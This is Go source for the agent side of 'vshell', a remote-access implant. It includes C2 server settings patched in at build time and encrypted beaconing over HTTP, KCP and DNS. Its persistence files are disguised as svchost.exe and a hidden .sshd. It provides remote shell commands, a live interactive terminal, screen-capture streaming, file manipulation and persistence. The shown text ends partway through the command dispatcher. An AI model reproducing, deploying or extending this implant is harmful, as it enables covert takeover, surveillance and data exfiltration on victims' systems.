// Package agent 实现运行在目标系统上的 vshell Agent，支持 HTTP、DNS、KCP 与 WebSocket 传输模式。
// Package agent implements the vshell agent that runs on target systems.
// Supports HTTP, DNS, KCP, and WebSocket transport modes.
//
//go:build !server
// +build !server

package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	kcp "github.com/xtaci/kcp-go/v5"
)

// ============================================================================
// Embedded Configuration (patched at build time via ldflags)
// 嵌入式配置（构建时通过 ldflags 修补）
// ============================================================================
var (
	ServerAddr  = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	VerifyKey   = "REPLACE_VERIFY_KEY___XXXXXXXXXXXXXXXXXXXXXXXX"
	EncryptSalt = "REPLACE_ENCRYPT_SALT_XXXXXXXXXXXXXXXXXXXXXXXX"
	ProxyAddr   = "REPLACE_PROXY_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	CDNURL      = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"
	DNSServer   = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"

	sleepTime    = 5
	jitterTime   = 3
	clientID     int64
	sessionID    string
	hostname     string
	username     string
	osName       = runtime.GOOS
	arch         = runtime.GOARCH
	processName  string
	localIP      string
	pid          int
	agentVersion = "3.1.0"
	transport    Transport
	persistPath  string
)

func init() {
	pid = os.Getpid()
	hostname, _ = os.Hostname()
	if u, err := user.Current(); err == nil {
		username = u.Username
	}
	if username == "" {
		username = os.Getenv("USER")
	}
	if exe, err := os.Executable(); err == nil {
		processName = exe
	} else {
		processName = os.Args[0]
	}
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, addr := range addrs {
			if ipn, ok := addr.(*net.IPNet); ok && !ipn.IP.IsLoopback() && ipn.IP.To4() != nil {
				localIP = ipn.IP.String()
				break
			}
		}
	}

	// Default persistence path
	if runtime.GOOS == "windows" {
		persistPath = os.Getenv("APPDATA") + "\\Microsoft\\Windows\\svchost.exe"
	} else {
		persistPath = os.Getenv("HOME") + "/.cache/.sshd"
	}

	log.SetPrefix(fmt.Sprintf("[%d] ", pid))
}

// ============================================================================
// System info gathering
// 系统信息收集
// ============================================================================

// SysInfo 保存 Agent 上报的系统信息。
// SysInfo holds the system info reported by the agent.
type SysInfo struct {
	Hostname    string   `json:"hostname"`
	Username    string   `json:"username"`
	OS          string   `json:"os"`
	Arch        string   `json:"arch"`
	CPUCores    int      `json:"cpu_cores"`
	PID         int      `json:"pid"`
	PPID        int      `json:"ppid"`
	ProcessName string   `json:"process_name"`
	LocalIPs    []string `json:"local_ips"`
	IsAdmin     bool     `json:"is_admin"`
	Uptime      string   `json:"uptime"`
	GoVersion   string   `json:"go_version"`
}

// getSysInfo 收集并返回系统信息。
// getSysInfo collects and returns system info.
func getSysInfo() *SysInfo {
	info := &SysInfo{
		Hostname:    hostname,
		Username:    username,
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		CPUCores:    runtime.NumCPU(),
		PID:         pid,
		PPID:        os.Getppid(),
		ProcessName: processName,
		GoVersion:   runtime.Version(),
	}

	// Check admin/root
	if runtime.GOOS == "windows" {
		info.IsAdmin = isWindowsAdmin()
	} else {
		info.IsAdmin = os.Geteuid() == 0
	}

	// Collect all local IPs
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipn, ok := addr.(*net.IPNet); ok && ipn.IP.To4() != nil {
			info.LocalIPs = append(info.LocalIPs, ipn.IP.String())
		}
	}

	return info
}

// isWindowsAdmin 判断当前是否以管理员权限运行。
// isWindowsAdmin reports whether the process runs with administrator privileges.
func isWindowsAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	f.Close()
	return true
}

// ============================================================================
// Transport interface and implementations
// 传输接口与实现
// ============================================================================

// Transport 抽象不同 C2 传输模式（HTTP/KCP/DNS/WebSocket）。
// Transport abstracts the different C2 transport modes (HTTP/KCP/DNS/WebSocket).
type Transport interface {
	Checkin() (*CheckinResponse, error)
	GetTasks() ([]TaskItem, error)
	SendResult(taskID int64, result, status string) error
	Close() error
}

// --- HTTP Transport ---
// HTTP 传输

type httpTransport struct {
	serverURL string
	client    *http.Client
}

// newHTTPTransport 创建 HTTP 传输。
// newHTTPTransport creates an HTTP transport.
func newHTTPTransport(url string) *httpTransport {
	return &httpTransport{
		serverURL: strings.TrimRight(url, "/"),
		client:    &http.Client{Timeout: 30 * time.Second},
	}
}

// postJSON 向服务器发送 JSON 请求。
// 消息体经 AES-256-GCM 帧加密（与 TCP/KCP 统一格式，服务器对所有入站
// 帧 GCM Open），base64 编码放入 HTTP body。
// postJSON sends a JSON request to the server. The body is wrapped in the
// AES-256-GCM message frame (same key/format as TCP/KCP), base64-encoded.
func (t *httpTransport) postJSON(path string, data []byte) (*http.Response, error) {
	enc := encryptFrame(data)
	body := []byte(base64.StdEncoding.EncodeToString(enc))
	return t.client.Post(t.serverURL+path, "application/json", bytes.NewReader(body))
}

// Checkin 执行 Agent 签到。
// Checkin performs the agent check-in.
func (t *httpTransport) Checkin() (*CheckinResponse, error) {
	req := CheckinRequest{
		VerifyKey:   VerifyKey,
		HostName:    hostname,
		UserName:    username,
		OsName:      runtime.GOOS,
		ProcessName: processName,
		LocalIP:     localIP,
		Arch:        runtime.GOARCH,
		PID:         pid,
		Version:     agentVersion,
	}
	body, _ := json.Marshal(req)
	resp, err := t.postJSON("/api/checkin", body)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var cr CheckinResponse
	json.NewDecoder(resp.Body).Decode(&cr)
	if cr.ClientID > 0 {
		clientID = cr.ClientID
		sessionID = cr.SessionID
	}
	if cr.Interval > 0 {
		sleepTime = cr.Interval
	}
	return &cr, nil
}

// GetTasks 轮询待处理任务。
// GetTasks polls for pending tasks.
func (t *httpTransport) GetTasks() ([]TaskItem, error) {
	url := fmt.Sprintf("%s/api/tasks?client_id=%d&verify_key=%s", t.serverURL, clientID, url.QueryEscape(VerifyKey))
	resp, err := t.client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var tr TaskResponse
	json.NewDecoder(resp.Body).Decode(&tr)
	if tr.Interval > 0 {
		sleepTime = tr.Interval
	}
	if tr.Tasks == nil {
		return nil, nil
	}
	return tr.Tasks, nil
}

// SendResult 回传任务结果。
// SendResult submits a task result.
func (t *httpTransport) SendResult(taskID int64, result, status string) error {
	req := ResultRequest{
		ClientID:  clientID,
		CommandID: taskID,
		Result:    result,
		Status:    status,
		VerifyKey: VerifyKey,
	}
	body, _ := json.Marshal(req)
	resp, err := t.postJSON("/api/result", body)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

// Close 关闭 HTTP 传输（无状态，空操作）。
// Close closes the HTTP transport (stateless, no-op).
func (t *httpTransport) Close() error { return nil }

// --- KCP Transport ---
// KCP 传输：服务器 KCP 监听器（c2engine/kcp.go）是带 AES 块加密 + FEC 的 kcp-go UDP
// 监听器，Agent 必须使用相同的线协议：
//
// The server's KCP listener (c2engine/kcp.go) is a kcp-go UDP listener with
// AES block crypt + FEC. The agent must speak the same wire protocol:
//   - connection: kcp-go UDP session (NOT plain TCP/UDP sockets)
//   - handshake: bare JSON check-in payload (no length prefix, no type byte)
//   - subsequent messages: [2-byte big-endian length][1-byte LinkMsgType][payload]
// The link message type constants mirror c2engine.LinkMsgType.

const (
	linkMsgMain   = 0x01 // main data channel (task poll, results)
	linkMsgConfig = 0x02 // configuration sync
	linkMsgChan   = 0x03 // tunnel/proxy data
	linkMsgHealth = 0x04 // health/heartbeat
	linkMsgClose  = 0x05 // close connection
)

// kcpTransport 是基于 KCP 的传输实现。
// kcpTransport is the KCP-based transport implementation.
type kcpTransport struct {
	serverAddr string
	sess       *kcp.UDPSession
	mu         sync.Mutex
}

// newKCPTransport 创建 KCP 传输。
// newKCPTransport creates a KCP transport.
func newKCPTransport(addr string) *kcpTransport {
	return &kcpTransport{serverAddr: addr}
}

// kcpBlockCrypt derives the AES key exactly as the server does: the raw
// concatenated salt+key material padded to 32 bytes (the server's plain [:32]
// slice panics on short keys, so both sides pad instead).
func kcpBlockCrypt(salt, key string) kcp.BlockCrypt {
	m := []byte(salt + key)
	if len(m) < 32 {
		m = append(m, make([]byte, 32-len(m))...)
	}
	block, _ := kcp.NewAESBlockCrypt(m[:32])
	return block
}

// connect 建立 KCP 会话。
// connect establishes the KCP session.
func (t *kcpTransport) connect() error {
	if t.sess != nil {
		t.sess.Close()
		t.sess = nil
	}
	sess, err := kcp.DialWithOptions(t.serverAddr, kcpBlockCrypt(EncryptSalt, VerifyKey), 10, 3)
	if err != nil {
		return err
	}
	// Mirror the server-side session tuning (acceptLoop).
	sess.SetStreamMode(true)
	sess.SetWriteDelay(false)
	sess.SetNoDelay(1, 10, 2, 1)
	sess.SetWindowSize(128, 128)
	sess.SetMtu(1350)
	t.sess = sess
	return nil
}

// maxKCPFrame keeps a single frame under the link protocol's 2-byte length
// prefix (65535) with headroom for the type byte; larger payloads are split
// into fragments and reassembled server-side.
const maxKCPFrame = 60000

// writeFrame 发送类型化、长度前缀消息（链路协议）。
// 消息体经 AES-256-GCM 帧加密（与 TCP 消息帧同 key/格式，服务器统一
// GCM Open 解密）。
// writeFrame sends a typed, length-prefixed message (link protocol).
// The payload is wrapped in the AES-256-GCM message frame (same key/
// format as TCP frames; the server GCM-opens every inbound frame).
func (t *kcpTransport) writeFrame(msgType byte, data []byte) error {
	if t.sess == nil {
		if err := t.connect(); err != nil {
			return err
		}
	}
	enc := encryptFrame(data)
	if len(enc)+1 > maxKCPFrame {
		return t.writeFragmented(data)
	}
	msg := make([]byte, 1+len(enc))
	msg[0] = msgType
	copy(msg[1:], enc)

	lenBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(lenBuf, uint16(len(msg)))
	t.sess.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := t.sess.Write(append(lenBuf, msg...)); err != nil {
		t.sess.Close()
		t.sess = nil
		return err
	}
	return nil
}

// writeFragmented 将超大载荷（如截图或屏幕帧）拆分为 maxKCPFrame 大小的分片，
// 每个分片是携带 {"_frag":k,"_total":n,"_data":<base64 chunk>} 的 LinkMsgMain
// 帧，服务器在处理前重组。
// writeFragmented splits an oversized payload (e.g. a screenshot or screen
// frame) into maxKCPFrame-sized fragments. Each fragment is a LinkMsgMain
// frame carrying {"_frag":k,"_total":n,"_data":<base64 chunk>}; the server
// reassembles them before handling the message.
func (t *kcpTransport) writeFragmented(data []byte) error {
	const chunkBytes = maxKCPFrame / 4 * 3 // base64 expands 4/3
	var chunks [][]byte
	for len(data) > 0 {
		n := len(data)
		if n > chunkBytes {
			n = chunkBytes
		}
		chunks = append(chunks, data[:n])
		data = data[n:]
	}
	total := len(chunks)
	for i, c := range chunks {
		frag, _ := json.Marshal(map[string]interface{}{
			"_frag":  i,
			"_total": total,
			"_data":  base64.StdEncoding.EncodeToString(c),
		})
		msg := make([]byte, 1+len(frag))
		msg[0] = linkMsgMain
		copy(msg[1:], frag)
		lenBuf := make([]byte, 2)
		binary.BigEndian.PutUint16(lenBuf, uint16(len(msg)))
		t.sess.SetWriteDeadline(time.Now().Add(30 * time.Second))
		if _, err := t.sess.Write(append(lenBuf, msg...)); err != nil {
			t.sess.Close()
			t.sess = nil
			return err
		}
	}
	return nil
}

// readFrame 读取一条类型化、长度前缀消息，跳过服务器心跳（服务器每 10 秒推送 LinkMsgHealth）。
// 消息体经 AES-256-GCM 帧解密。
// readFrame reads one typed, length-prefixed message, skipping server
// heartbeats (the server pushes LinkMsgHealth every 10s on its own).
// The payload is GCM-opened (same frame format as TCP).
func (t *kcpTransport) readFrame() (byte, []byte, error) {
	if t.sess == nil {
		return 0, nil, io.ErrClosedPipe
	}
	for {
		lenBuf := make([]byte, 2)
		t.sess.SetReadDeadline(time.Now().Add(15 * time.Second))
		if _, err := io.ReadFull(t.sess, lenBuf); err != nil {
			return 0, nil, err
		}
		length := binary.BigEndian.Uint16(lenBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(t.sess, data); err != nil {
			return 0, nil, err
		}
		if length == 0 {
			return 0, nil, nil
		}
		if data[0] == linkMsgHealth {
			continue
		}
		pt, err := decryptFrame(data[1:])
		if err != nil {
			return 0, nil, err
		}
		return data[0], pt, nil
	}
}

func (t *kcpTransport) Checkin() (*CheckinResponse, error) {
	hs := map[string]interface{}{
		"verify_key": VerifyKey,
		"hostname":   hostname,
		"username":   username,
		"os":         runtime.GOOS,
		"process":    processName,
	}
	data, _ := json.Marshal(hs)

	t.mu.Lock()
	defer t.mu.Unlock()

	if t.sess == nil {
		if err := t.connect(); err != nil {
			return nil, err
		}
	}
	// Handshake: bare JSON, exactly what the server's handleSession reads.
	t.sess.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := t.sess.Write(data); err != nil {
		t.sess.Close()
		t.sess = nil
		return nil, err
	}

	msgType, resp, err := t.readFrame()
	if err != nil {
		return nil, err
	}
	if msgType != linkMsgMain {
		return nil, fmt.Errorf("unexpected check-in response type %d", msgType)
	}
	var cr CheckinResponse
	if err := json.Unmarshal(resp, &cr); err != nil {
		return nil, err
	}
	if cr.ClientID > 0 {
		clientID = cr.ClientID
	}
	return &cr, nil
}

func (t *kcpTransport) GetTasks() ([]TaskItem, error) {
	req, _ := json.Marshal(map[string]interface{}{"type": "task_poll", "client_id": clientID, "verify_key": VerifyKey})

	t.mu.Lock()
	defer t.mu.Unlock()

	if err := t.writeFrame(linkMsgMain, req); err != nil {
		return nil, err
	}
	_, resp, err := t.readFrame()
	if err != nil {
		return nil, err
	}
	var tr TaskResponse
	if err := json.Unmarshal(resp, &tr); err != nil {
		return nil, err
	}
	return tr.Tasks, nil
}

func (t *kcpTransport) SendResult(taskID int64, result, status string) error {
	req, _ := json.Marshal(ResultRequest{ClientID: clientID, CommandID: taskID, Result: result, Status: status, VerifyKey: VerifyKey})

	t.mu.Lock()
	defer t.mu.Unlock()

	// The server does not acknowledge individual results (LinkMsgMain handler
	// only stores/forwards them), so no response read here.
	return t.writeFrame(linkMsgMain, req)
}

func (t *kcpTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.sess != nil {
		t.writeFrame(linkMsgClose, nil)
		t.sess.Close()
		t.sess = nil
	}
	return nil
}

// --- DNS Transport ---
// DNS 传输

type dnsTransport struct {
	domain string
}

// newDNSTransport 创建 DNS 传输。
// newDNSTransport creates a DNS transport.
func newDNSTransport(domain string) *dnsTransport {
	return &dnsTransport{domain: domain}
}

// dnsQuery 发送 DNS 查询并返回 TXT 记录。
// dnsQuery sends a DNS query and returns TXT records.
func (t *dnsTransport) dnsQuery(subdomain string) ([]string, error) {
	query := subdomain + "." + t.domain
	return net.LookupTXT(query)
}

// Checkin 通过 DNS 执行签到。
// Checkin performs the check-in over DNS.
func (t *dnsTransport) Checkin() (*CheckinResponse, error) {
	data := hex.EncodeToString([]byte(fmt.Sprintf("checkin:%s|%s|%s", hostname, username, runtime.GOOS)))
	if _, err := t.dnsQuery(data); err != nil {
		return nil, fmt.Errorf("dns checkin failed: %w", err)
	}
	return &CheckinResponse{Status: "ok", Interval: 10}, nil
}

// GetTasks 通过 DNS 轮询任务。
// GetTasks polls tasks over DNS.
func (t *dnsTransport) GetTasks() ([]TaskItem, error) {
	txts, err := t.dnsQuery(fmt.Sprintf("task.%d", clientID))
	if err != nil {
		return nil, fmt.Errorf("dns task poll failed: %w", err)
	}
	var tasks []TaskItem
	for _, txt := range txts {
		if strings.HasPrefix(txt, "task:") {
			parts := strings.SplitN(txt[5:], ":", 2)
			if len(parts) == 2 {
				var id int64
				fmt.Sscanf(parts[0], "%d", &id)
				dec, _ := hex.DecodeString(parts[1])
				tasks = append(tasks, TaskItem{ID: id, Command: string(dec), Timeout: 30})
			}
		}
	}
	return tasks, nil
}

// SendResult 通过 DNS 回传任务结果。
// SendResult submits a task result over DNS.
func (t *dnsTransport) SendResult(taskID int64, result, status string) error {
	data := hex.EncodeToString([]byte(fmt.Sprintf("result:%d:%s", taskID, result)))
	_, err := t.dnsQuery(data)
	if err != nil {
		return fmt.Errorf("dns result send failed: %w", err)
	}
	return nil
}

// Close 关闭 DNS 传输（无状态，空操作）。
// Close closes the DNS transport (stateless, no-op).
func (t *dnsTransport) Close() error { return nil }

// ============================================================================
// Message types
// 协议消息类型
// ============================================================================

// CheckinRequest 是签到请求。
// CheckinRequest is the check-in request.
type CheckinRequest struct {
	VerifyKey   string `json:"verify_key"`
	HostName    string `json:"hostname"`
	UserName    string `json:"username"`
	OsName      string `json:"os"`
	ProcessName string `json:"process"`
	LocalIP     string `json:"local_ip"`
	Arch        string `json:"arch,omitempty"`
	PID         int    `json:"pid,omitempty"`
	Version     string `json:"version,omitempty"`
}

// CheckinResponse 是签到响应。
// CheckinResponse is the check-in response.
type CheckinResponse struct {
	Status    string `json:"status"`
	ClientID  int64  `json:"client_id"`
	SessionID string `json:"session_id"`
	Interval  int    `json:"interval"`
	Timeout   int    `json:"timeout"`
	Message   string `json:"message,omitempty"`
}

// TaskResponse 是任务轮询响应。
// TaskResponse is the task polling response.
type TaskResponse struct {
	Tasks    []TaskItem `json:"tasks"`
	Interval int        `json:"interval"`
}

// TaskItem 是单条任务。
// TaskItem is a single task.
type TaskItem struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
	Timeout int    `json:"timeout"`
}

// ResultRequest 是结果回传请求。
// ResultRequest is the result submission request.
type ResultRequest struct {
	ClientID  int64  `json:"client_id"`
	CommandID int64  `json:"command_id"`
	Result    string `json:"result"`
	Status    string `json:"status"`
	// VerifyKey proves the caller knows the listener key; the server rejects
	// task/result requests without it when the listener has a key set.
	VerifyKey string `json:"verify_key,omitempty"`
}

// ============================================================================
// Command execution
// 命令执行
// ============================================================================

const (
	CmdShell      = "shell"
	CmdUpload     = "upload"
	CmdDownload   = "download"
	CmdSleep      = "sleep"
	CmdExit       = "exit"
	CmdScreenshot = "screenshot"
	CmdScreen     = "screen"
	CmdFileList   = "filelist"
	CmdFileDelete = "filedelete"
	CmdFileMove   = "filemove"
	CmdFileTouch  = "filetouch"
	CmdFileMkdir  = "filemkdir"
	CmdFileCat    = "filecat"
	CmdDiskInfo   = "diskinfo"
	CmdPS         = "ps"
	CmdKill       = "kill"
	CmdSysInfo    = "sysinfo"
	CmdPersist    = "persist"
	CmdCleanup    = "cleanup"
	CmdProxy      = "proxy"
	CmdProxyStop  = "proxystop"
	CmdPlugin     = "plugin"
	CmdWget       = "wget"
)

// ============================================================================
// Interactive remote terminal session
// 交互式远程终端会话
//
// The web panel's terminal relays to the agent via these commands:
//   terminal_start type=<bash|sh|cmd> rows=N cols=M
//   terminal_input:<base64>   terminal_resize rows=N cols=M
//   terminal_close
// The agent spawns a shell, keeps it across tasks, and streams the shell's
// output back as "terminal_output:<base64>" results (the server relays those
// to the browser's terminal WebSocket live).
// ============================================================================

// agentTermSession 保存交互式终端会话状态。
// agentTermSession holds interactive terminal session state.
type agentTermSession struct {
	mu       sync.Mutex
	cmd      *exec.Cmd
	stdin    io.WriteCloser
	taskID   int64
	active   bool
	// waitOnce ensures cmd.Wait() is called exactly once per session (shell-exit
	// goroutine OR terminalClose). It is replaced on every startTerminal: a
	// sync.Once value would fire only once for the agent's whole lifetime and
	// break every terminal session after the first.
	waitOnce *sync.Once
}

var termSess agentTermSession

// submitTerminalOutput streams shell output to the server as a terminal_output
// result bound to the terminal's task ID (the server routes by client ID).
func submitTerminalOutput(taskID int64, data []byte) {
	if transport == nil {
		return
	}
	enc := base64.StdEncoding.EncodeToString(data)
	if err := transport.SendResult(taskID, "terminal_output:"+enc, "completed"); err != nil {
		log.Printf("Terminal output send failed: %v", err)
	}
}

func startTerminal(termType string, rows, cols int, taskID int64) (string, string) {
	termSess.mu.Lock()
	defer termSess.mu.Unlock()

	if termSess.active {
		// Replace any existing session: kill it, then reap it through the old
		// session's own once so we never double-Wait with the previous session's
		// exit goroutine (exec.Cmd.Wait must not be called concurrently).
		oldCmd := termSess.cmd
		oldOnce := termSess.waitOnce
		if oldCmd != nil && oldCmd.Process != nil {
			oldCmd.Process.Kill()
		}
		termSess.mu.Unlock()
		if oldOnce != nil {
			oldOnce.Do(func() { oldCmd.Wait() })
		}
		termSess.mu.Lock()
		termSess.active = false
	}

	shell := "/bin/bash"
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		switch termType {
		case "sh":
			shell = "/bin/sh"
		case "bash":
			shell = "/bin/bash"
		}
	}

	cmd := exec.Command(shell)
	hideCmdWindow(cmd)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "", err.Error()
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err.Error()
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err.Error()
	}
	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	termSess.cmd = cmd
	termSess.stdin = stdin
	termSess.taskID = taskID
	termSess.active = true
	// Fresh once per session: the shell-exit goroutine and terminalClose share
	// this pointer only, so a later session's once is never consumed here.
	once := &sync.Once{}
	termSess.waitOnce = once

	readLoop := func(r io.Reader) {
		buf := make([]byte, 4096)
		for {
			n, err := r.Read(buf)
			if n > 0 {
				// submitTerminalOutput base64-encodes synchronously before the
				// next Read reuses buf, so passing buf[:n] directly is safe.
				submitTerminalOutput(taskID, buf[:n])
			}
			if err != nil {
				return
			}
		}
	}
	go readLoop(stdout)
	go readLoop(stderr)

	// Detect shell self-exit (e.g. the user typed `exit`): mark the session
	// inactive so terminal_input stops writing to a dead pipe, and let the
	// readLoop goroutines wind down on EOF. waitOnce guards cmd.Wait() so this
	// never races terminalClose's own Wait.
	go func() {
		once.Do(func() { cmd.Wait() })
		termSess.mu.Lock()
		// Only tear down our own session; a stale exit goroutine must not kill
		// a replacement session that started after we exited.
		if termSess.cmd == cmd {
			termSess.active = false
		}
		termSess.mu.Unlock()
		log.Printf("Terminal (task %d) exited", taskID)
	}()

	log.Printf("Terminal started (%s), task %d", shell, taskID)
	return "terminal started", ""
}

func terminalInput(encoded string) (string, string) {
	// Copy the stdin reference under the lock, then write WITHOUT holding it:
	// a pipe write blocks once the shell's stdin buffer fills and the shell
	// isn't draining it, which would otherwise stall the whole agent (the task
	// loop is single-threaded).
	termSess.mu.Lock()
	if !termSess.active || termSess.stdin == nil {
		termSess.mu.Unlock()
		return "", "no active terminal"
	}
	stdin := termSess.stdin
	termSess.mu.Unlock()

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err.Error()
	}
	if _, err := stdin.Write(data); err != nil {
		return "", err.Error()
	}
	return "ok", ""
}

func terminalClose() (string, string) {
	termSess.mu.Lock()
	cmd := termSess.cmd
	once := termSess.waitOnce
	if termSess.active && cmd != nil && cmd.Process != nil {
		cmd.Process.Kill()
	}
	termSess.active = false
	termSess.mu.Unlock()

	// Reap the process outside the lock; the session's once prevents a race
	// with the shell-exit goroutine's own Wait.
	if cmd != nil && once != nil {
		once.Do(func() { cmd.Wait() })
	}
	return "terminal closed", ""
}

// ============================================================================
// Screen capture streaming
// 屏幕捕获流
//
//   screen_capture_start quality=N fps=M
//   screen_capture_stop      screen_capture_quality=N   screen_capture_fps=N
//
// Frames are streamed back as "screen_frame:<format>:<index>:<base64>"
// results; the server relays them (as binary) to the screen viewer WebSocket.
// ============================================================================

// agentScreenCapture 保存屏幕捕获流状态。
// agentScreenCapture holds screen capture streaming state.
type agentScreenCapture struct {
	mu     sync.Mutex
	stop   chan struct{}
	taskID int64
	index  int64
	active bool
	fps    int
}

var screenCap agentScreenCapture

func startScreenCapture(quality, fps int, taskID int64) (string, string) {
	screenCap.mu.Lock()
	if screenCap.active {
		// Stop the existing goroutine by closing the channel it captured.
		close(screenCap.stop)
	}
	stop := make(chan struct{})
	screenCap.stop = stop
	screenCap.taskID = taskID
	screenCap.index = 0
	screenCap.active = true
	screenCap.fps = fps
	if screenCap.fps <= 0 {
		screenCap.fps = 1
	}
	screenCap.mu.Unlock()

	go func() {
		for {
			// Re-read fps under the lock each tick so screen_capture_fps=N
			// takes effect on the running stream. `stop` is captured ONCE (this
			// goroutine's own channel), so replacing screenCap.stop on restart
			// cannot race or misroute this goroutine.
			screenCap.mu.Lock()
			f := screenCap.fps
			if f <= 0 {
				f = 1
			}
			screenCap.mu.Unlock()

			interval := time.Second / time.Duration(f)
			if interval < 50*time.Millisecond {
				interval = 50 * time.Millisecond
			}

			timer := time.NewTimer(interval)
			select {
			case <-timer.C:
				// captureScreenshot() already returns base64 — use it directly
				// instead of decode→re-encode churn.
				enc, errMsg := captureScreenshot()
				if enc == "" || errMsg != "" {
					continue
				}
				screenCap.mu.Lock()
				screenCap.index++
				idx := screenCap.index
				screenCap.mu.Unlock()
				payload := "screen_frame:png:" + strconv.FormatInt(idx, 10) + ":" + enc
				if transport != nil {
					if err := transport.SendResult(taskID, payload, "completed"); err != nil {
						log.Printf("Screen frame send failed: %v", err)
					}
				}
			case <-stop:
				timer.Stop()
				return
			}
		}
	}()

	log.Printf("Screen capture started (fps=%d), task %d", fps, taskID)
	return "screen capture started", ""
}

func stopScreenCapture() (string, string) {
	screenCap.mu.Lock()
	defer screenCap.mu.Unlock()
	if screenCap.active {
		close(screenCap.stop)
		screenCap.active = false
	}
	return "screen capture stopped", ""
}

func setScreenCaptureParam(kind string, value int) (string, string) {
	screenCap.mu.Lock()
	defer screenCap.mu.Unlock()
	switch kind {
	case "fps":
		screenCap.fps = value
	case "quality":
		// quality is a hint for compression; the capture tools ignore it
	}
	return "ok", ""
}

// dispatchTerminalCommand parses "terminal_*" relay commands.
func dispatchTerminalCommand(taskID int64, cmdStr string) (string, string) {
	switch {
	case strings.HasPrefix(cmdStr, "terminal_start"):
		typ := "cmd"
		rows, cols := 24, 80
		parseKV(cmdStr, func(k, v string) {
			switch k {
			case "type":
				typ = v
			case "rows":
				fmt.Sscanf(v, "%d", &rows)
			case "cols":
				fmt.Sscanf(v, "%d", &cols)
			}
		})
		return startTerminal(typ, rows, cols, taskID)
	case strings.HasPrefix(cmdStr, "terminal_input:"):
		return terminalInput(strings.TrimPrefix(cmdStr, "terminal_input:"))
	case strings.HasPrefix(cmdStr, "terminal_resize"):
		// Size hint only; pipe-backed shell ignores it.
		return "ok", ""
	case strings.HasPrefix(cmdStr, "terminal_close"):
		return terminalClose()
	}
	return "unknown terminal command", ""
}

// dispatchScreenCommand parses "screen_capture*" relay commands.
func dispatchScreenCommand(taskID int64, cmdStr string) (string, string) {
	switch {
	case strings.HasPrefix(cmdStr, "screen_capture_start"):
		quality, fps := 50, 5
		parseKV(cmdStr, func(k, v string) {
			switch k {
			case "quality":
				fmt.Sscanf(v, "%d", &quality)
			case "fps":
				fmt.Sscanf(v, "%d", &fps)
			}
		})
		return startScreenCapture(quality, fps, taskID)
	case strings.HasPrefix(cmdStr, "screen_capture_stop"):
		return stopScreenCapture()
	case strings.HasPrefix(cmdStr, "screen_capture_quality"):
		var q int
		fmt.Sscanf(strings.TrimPrefix(cmdStr, "screen_capture_quality="), "%d", &q)
		return setScreenCaptureParam("quality", q)
	case strings.HasPrefix(cmdStr, "screen_capture_fps"):
		var f int
		fmt.Sscanf(strings.TrimPrefix(cmdStr, "screen_capture_fps="), "%d", &f)
		return setScreenCaptureParam("fps", f)
	}
	return "unknown screen capture command", ""
}

// parseKV walks "key=value key2=value2 ..." tokens from a relay command.
func parseKV(s string, fn func(k, v string)) {
	fields := strings.Fields(s)
	for _, f := range fields {
		if kv := strings.SplitN(f, "=", 2); len(kv) == 2 {
			fn(kv[0], kv[1])
		}
	}
}

// executeCommand executes a task command. ALIGNMENT: the original binary's
// task-execute dispatcher is FUN_010952e0 (0x10952e0, 30-case switch 0x0-0x2a,
// 98KB decompile in .re/decomp/agent_map_10952e0.txt): interval get/set (0x0),
// sleep mode (0x2), session/process list dumps (0xe/0x15), config-key
// enumeration (0x1f), ping/pong (0x1a), destroy (0x22). This Go reimplementation
// covers the shell/screen/terminal subset; the full 43-case matrix maps to
// frames emitted via FUN_0100d160/FUN_0100d440/FUN_0100d5e0.
func executeCommand(taskID int64, cmdStr string, timeout int) (string, string) {
	// Interactive terminal commands are dispatched as plain (non-JSON) strings
	// by the web panel's terminal relay. Handle them before the JSON parse.
	if strings.HasPrefix(cmdStr, "terminal_") {
		return dispatchTerminalCommand(taskID, cmdStr)
	}
	if strings.HasPrefix(cmdStr, "screen_capture") {
		return dispatchScreenCommand(taskID, cmdStr)
	}

	var cmdType string
	var payload map[string]interface{}

	if err := json.Unmarshal([]byte(cmdStr), &payload); err == nil {
		if t, ok := payload["type"].(string); ok {
			cmdType = t
		}
	} else {
		cmdType = CmdShell
	}

	switch cmdType {
	case CmdShell:
		command, _ := payload["command"].(string)
		if command == "" {
			command = cmdStr
		}
		// Terminal/screen relay commands arrive wrapped as
		// {"command":"terminal_start …","type":"shell"}.
		if strings.HasPrefix(command, "terminal_") {
			return dispatchTerminalCommand(taskID, command)
		}
		if strings.HasPrefix(command, "screen_capture") {
			return dispatchScreenCommand(taskID, command)
		}
		return runCommand(command, timeout)

	case CmdSysInfo:
		info := getSysInfo()
		data, _ := json.MarshalIndent(info, "", "  ")
		return string(data), ""

	case CmdPersist:
		return installPersistence()

	case CmdCleanup:
		return removePersistence()

	case CmdFileList:
		path, _ := payload["path"].(string)
		if path == "" {
			path = "."
		}
		return listDir(path)

	case CmdFileDelete:
